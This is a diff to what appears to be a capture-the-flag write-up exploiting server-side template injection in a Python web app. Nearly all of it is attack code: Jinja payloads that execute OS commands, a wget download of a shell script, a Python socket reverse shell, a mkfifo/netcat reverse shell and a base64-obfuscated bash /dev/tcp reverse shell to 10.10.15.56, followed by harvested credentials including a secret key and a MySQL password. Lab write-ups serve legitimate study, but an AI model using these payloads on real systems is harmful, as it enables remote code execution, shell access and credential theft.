@@ -55,13 +55,21 @@ by using {{ 7 * 7 }} for example, we can see that the code is executed cause we 
 
 So to get a reverse shell, we can use this crafted payload:
 
-{{self.__init__.__globals__.__builtins__.__import__('os').system('wget http://10.10.15.56:8000/shell.py -O /tmp/shell.py')}}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('which id').read() }}
 
-import socket,os,pty;
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("10.10.15.56",6666));
-os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
-pty.spawn("/bin/sh");
+
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.56 6666 >/tmp/f \
+en base64 \
+cm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuNTYgNjY2NiA+L3RtcC9mCg== \
+
+
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS41Ni82NjY2IDA+JjEiCg==" | base64 -d | bash').read() }}
+
+we are now atlas\
+in app.py file, we found a passphrase : $M1DGu4rD$
+
+in the __init__.py file, we found the sql credentials : \
+
+app.config['SECRET_KEY'] = '91668c1bc67132e3dcfb5b1a3e0c5c21' \
+app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'
 
